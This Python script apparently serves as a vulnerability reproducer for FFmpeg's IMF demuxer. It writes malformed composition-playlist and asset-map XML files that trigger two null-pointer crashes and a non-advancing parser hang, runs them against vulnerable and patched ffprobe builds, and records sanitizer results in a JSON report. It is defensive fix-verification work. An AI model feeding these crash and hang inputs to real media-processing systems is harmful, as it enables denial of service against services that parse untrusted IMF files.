"""Differentially reproduce two malformed-XML crashes in FFmpeg's IMF demuxer."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import subprocess
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

SCHEMA_VERSION = "cw.ffmpeg.imf-crash-reproducer.v1"
VULNERABLE_COMMIT = "795bccdaf57772b1803914dee2f32d52776518e2"
MISSING_PATH_REPAIR = "0fe4bd4b435b1de950890d37b1e4df7bae3655b1"
ZERO_RESOURCE_REPAIR = "a76190152d0d1e90f38a761e0a1443c1dcb4e7a8"

CASES = {
    "missing_assetmap_path": {
        "cpl": """\
<CompositionPlaylist xmlns="http://www.smpte-ra.org/schemas/2067-3/2016">
  <Id>urn:uuid:8713c020-2489-45f5-a9f7-87be539e20b5</Id>
  <ContentTitle>Missing AssetMap Path</ContentTitle>
  <EditRate>24 1</EditRate>
  <SegmentList/>
</CompositionPlaylist>
""",
        "assetmap": """\
<AssetMap>
  <AssetList>
    <Asset>
      <Id>urn:uuid:b5d674b8-c6ce-4bce-3bdf-be045dfdb2d0</Id>
      <ChunkList><Chunk/></ChunkList>
    </Asset>
  </AssetList>
</AssetMap>
""",
        "repair_message": "missing Path element in Chunk",
    },
    "zero_resource_virtual_track": {
        "cpl": """\
<CompositionPlaylist xmlns="http://www.smpte-ra.org/schemas/2067-3/2016"
                     xmlns:cc="http://www.smpte-ra.org/schemas/2067-2/2016">
  <Id>urn:uuid:8713c020-2489-45f5-a9f7-87be539e20b5</Id>
  <ContentTitle>Zero Resource Virtual Track</ContentTitle>
  <EditRate>24 1</EditRate>
  <SegmentList>
    <Segment>
      <SequenceList>
        <cc:MainImageSequence>
          <TrackId>urn:uuid:e8ef9653-565c-479c-8039-82d4547973c5</TrackId>
        </cc:MainImageSequence>
      </SequenceList>
    </Segment>
  </SegmentList>
</CompositionPlaylist>
""",
        "assetmap": "<AssetMap><AssetList/></AssetMap>\n",
        "repair_message": "Virtual track has no resources",
    },
}

HANG_CASE = {
    "cpl": """\
<CompositionPlaylist xmlns="http://www.smpte-ra.org/schemas/2067-3/2016">
  <Id>urn:uuid:8713c020-2489-45f5-a9f7-87be539e20b5</Id>
  <ContentTitle>Non-Asset Child</ContentTitle>
  <EditRate>24 1</EditRate>
  <SegmentList/>
</CompositionPlaylist>
""",
    "assetmap": "<AssetMap><AssetList><Annotation/></AssetList></AssetMap>\n",
}


def _arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--vulnerable-build-dir", type=Path, required=True)
    parser.add_argument("--repaired-build-dir", type=Path, required=True)
    parser.add_argument("--scratch-dir", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    return parser.parse_args()


def _sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for block in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(block)
    return digest.hexdigest()


def _head(path: Path) -> str:
    result = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=path,
        check=False,
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def _run(binary: Path, case_dir: Path) -> dict[str, Any]:
    command = [
        str(binary),
        "-v",
        "debug",
        "-f",
        "imf",
        str(case_dir / "CPL.xml"),
    ]
    environment = os.environ.copy()
    environment["ASAN_OPTIONS"] = (
        "halt_on_error=1:abort_on_error=1:detect_leaks=0"
    )
    result = subprocess.run(
        command,
        cwd=case_dir,
        env=environment,
        check=False,
        capture_output=True,
        text=True,
    )
    return {
        "command": command,
        "returncode": result.returncode,
        "stdout": result.stdout,
        "stderr": result.stderr,
    }


def _run_with_timeout(
    binary: Path, case_dir: Path, timeout_seconds: float
) -> dict[str, Any]:
    command = [
        str(binary),
        "-v",
        "debug",
        "-f",
        "imf",
        str(case_dir / "CPL.xml"),
    ]
    environment = os.environ.copy()
    environment["ASAN_OPTIONS"] = "detect_leaks=0"
    try:
        result = subprocess.run(
            command,
            cwd=case_dir,
            env=environment,
            check=False,
            capture_output=True,
            text=True,
            timeout=timeout_seconds,
        )
    except subprocess.TimeoutExpired as error:
        stdout = error.stdout or b""
        stderr = error.stderr or b""
        return {
            "command": command,
            "timeout_seconds": timeout_seconds,
            "timed_out": True,
            "returncode": None,
            "stdout": (
                stdout.decode(errors="replace")
                if isinstance(stdout, bytes)
                else stdout
            ),
            "stderr": (
                stderr.decode(errors="replace")
                if isinstance(stderr, bytes)
                else stderr
            ),
        }
    return {
        "command": command,
        "timeout_seconds": timeout_seconds,
        "timed_out": False,
        "returncode": result.returncode,
        "stdout": result.stdout,
        "stderr": result.stderr,
    }


def main() -> None:
    args = _arguments()
    vulnerable_build = args.vulnerable_build_dir.expanduser().resolve()
    repaired_build = args.repaired_build_dir.expanduser().resolve()
    scratch = args.scratch_dir.expanduser().resolve()
    output = args.output.expanduser().resolve()
    vulnerable_binary = vulnerable_build / "ffprobe"
    repaired_binary = repaired_build / "ffprobe"
    if _head(vulnerable_build) != VULNERABLE_COMMIT:
        raise ValueError(f"vulnerable build must be at {VULNERABLE_COMMIT}")
    if _head(repaired_build) != ZERO_RESOURCE_REPAIR:
        raise ValueError(f"repaired build must be at {ZERO_RESOURCE_REPAIR}")
    if not vulnerable_binary.is_file() or not repaired_binary.is_file():
        raise ValueError("both FFmpeg trees must contain a configured ffprobe")

    vulnerable_source = (vulnerable_build / "libavformat/imfdec.c").read_text(
        encoding="utf-8", errors="replace"
    )
    repaired_source = (repaired_build / "libavformat/imfdec.c").read_text(
        encoding="utf-8", errors="replace"
    )
    source_indicators = {
        "vulnerable_path_content_is_unchecked": (
            "xmlNodeGetContent(ff_imf_xml_get_child_element_by_name(node, \"Path\"))"
            in vulnerable_source
        ),
        "vulnerable_first_resource_is_unconditional": (
            "c->tracks[i]->resources[0].ctx->streams[0]" in vulnerable_source
        ),
        "missing_path_repair_is_present": (
            "if (!path_node)" in repaired_source
            and "if (!uri || !uri[0])" in repaired_source
        ),
        "zero_resource_repair_is_present": (
            "if (!virtual_track->resource_count)" in repaired_source
        ),
        "non_asset_child_retries_without_advancing": (
            'if (av_strcasecmp(asset_element->name, "Asset") != 0)\n'
            "            continue;" in vulnerable_source
        ),
    }

    scratch.mkdir(parents=True, exist_ok=True)
    case_results: dict[str, Any] = {}
    for name, definition in CASES.items():
        case_dir = scratch / name
        case_dir.mkdir(parents=True, exist_ok=True)
        (case_dir / "CPL.xml").write_text(definition["cpl"], encoding="utf-8")
        (case_dir / "ASSETMAP.xml").write_text(
            definition["assetmap"], encoding="utf-8"
        )
        vulnerable = _run(vulnerable_binary, case_dir)
        repaired = _run(repaired_binary, case_dir)
        indicators = {
            "vulnerable_aborted": vulnerable["returncode"] < 0,
            "vulnerable_asan_deadly_signal": (
                "AddressSanitizer:DEADLYSIGNAL" in vulnerable["stderr"]
            ),
            "repaired_rejected_input": repaired["returncode"] == 1,
            "repaired_reported_exact_guard": (
                definition["repair_message"] in repaired["stderr"]
            ),
            "repaired_sanitizer_clean": (
                "AddressSanitizer" not in repaired["stderr"]
            ),
        }
        case_results[name] = {
            "cpl": str(case_dir / "CPL.xml"),
            "assetmap": str(case_dir / "ASSETMAP.xml"),
            "vulnerable": vulnerable,
            "repaired": repaired,
            "runtime_indicators": indicators,
            "expected_observed": all(indicators.values()),
        }

    hang_dir = scratch / "non_asset_child_hang"
    hang_dir.mkdir(parents=True, exist_ok=True)
    (hang_dir / "CPL.xml").write_text(HANG_CASE["cpl"], encoding="utf-8")
    (hang_dir / "ASSETMAP.xml").write_text(
        HANG_CASE["assetmap"], encoding="utf-8"
    )
    hang_run = _run_with_timeout(vulnerable_binary, hang_dir, 2.0)
    hang_indicators = {
        "pinned_demuxer_exceeded_timeout": hang_run["timed_out"],
        "input_reached_asset_map_parser": (
            "start parsing IMF Asset Map" in hang_run["stderr"]
        ),
        "no_sanitizer_failure_preceded_timeout": (
            "AddressSanitizer" not in hang_run["stderr"]
        ),
    }
    case_results["non_asset_child_hang"] = {
        "cpl": str(hang_dir / "CPL.xml"),
        "assetmap": str(hang_dir / "ASSETMAP.xml"),
        "vulnerable": hang_run,
        "runtime_indicators": hang_indicators,
        "expected_observed": all(hang_indicators.values()),
        "repair_status": "unrepaired at the two exact crash-repair commits",
    }

    expected_observed = all(source_indicators.values()) and all(
        case["expected_observed"] for case in case_results.values()
    )
    payload = {
        "schema_version": SCHEMA_VERSION,
        "completed_at": datetime.now(UTC).isoformat(),
        "vulnerable_build": str(vulnerable_build),
        "vulnerable_commit": _head(vulnerable_build),
        "vulnerable_binary_sha256": _sha256(vulnerable_binary),
        "repaired_build": str(repaired_build),
        "missing_path_repair": MISSING_PATH_REPAIR,
        "zero_resource_repair": ZERO_RESOURCE_REPAIR,
        "repaired_commit": _head(repaired_build),
        "repaired_binary_sha256": _sha256(repaired_binary),
        "source_indicators": source_indicators,
        "cases": case_results,
        "expected_observed": expected_observed,
        "scope": (
            "Malformed local IMF XML reaches two independent null-pointer "
            "dereferences and one non-advancing parser loop in the pinned "
            "demuxer. Exact upstream repairs reject the identical missing-Path "
            "and zero-resource inputs; a non-Asset child still demonstrates the "
            "separate bounded-time hang."
        ),
    }
    output.parent.mkdir(parents=True, exist_ok=True)
    temporary = output.with_suffix(output.suffix + ".tmp")
    temporary.write_text(
        json.dumps(payload, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    temporary.replace(output)
    print(output)
    if not expected_observed:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
